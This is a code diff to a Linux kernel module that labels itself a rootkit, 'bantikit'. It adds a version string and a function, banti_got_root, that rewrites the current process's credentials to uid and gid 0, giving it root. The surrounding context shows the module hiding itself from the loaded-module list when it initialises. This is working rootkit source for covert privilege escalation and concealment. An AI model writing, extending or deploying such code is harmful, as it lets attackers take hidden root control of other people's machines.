@@ -40,6 +40,17 @@ static struct list_head *module_kobj_prev;
 
 
 /*---------------------------------------------
+| Get banti version
+---------------------------------------------*/
+const char* banti_get_version(void)
+{
+    static char str[128];
+    sprintf(str, "%s Build %d", DRIVER_VERSION, DRIVER_BUILD);
+    return str;
+}
+
+
+/*---------------------------------------------
 | Initialise bantikit flags
 ---------------------------------------------*/
 void init_banti(void) 
@@ -90,6 +101,30 @@ void banti_module_show(void)
     fl->module_hidden = 0;
 }
 
+
+/*---------------------------------------------
+| Get root access for process id
+---------------------------------------------*/
+void banti_got_root(void) 
+{
+    /* Get credintials */
+    struct cred *creds = prepare_creds();
+
+    /* Check valid credintials */
+    if(creds)
+    {
+        /* Get root indifier */
+        creds->uid.val = creds->gid.val = 0;
+        creds->euid.val = creds->egid.val = 0;
+        creds->suid.val = creds->sgid.val = 0;
+        creds->fsuid.val = creds->fsgid.val = 0;
+
+        /* Get root access */
+        commit_creds(creds);
+    }
+}
+
+
 /*---------------------------------------------
 | Initialise rootkit module
 ---------------------------------------------*/
@@ -100,7 +135,8 @@ static int __init banti_kit_init(void)
     banti_module_hide();
 
     /* Debug log */
-    printk(KERN_INFO "Loades banti module\n");
+    printk(KERN_INFO "Loaded Banti Module: Version %s\n", banti_get_version());
+
     return 0;
 }
 
@@ -110,7 +146,7 @@ static int __init banti_kit_init(void)
 ---------------------------------------------*/
 static void __exit banti_kit_clean(void)
 {
-    printk(KERN_INFO "Unloaded banti module\n");
+    printk(KERN_INFO "Unloaded Banti Module\n");
 }
 
 
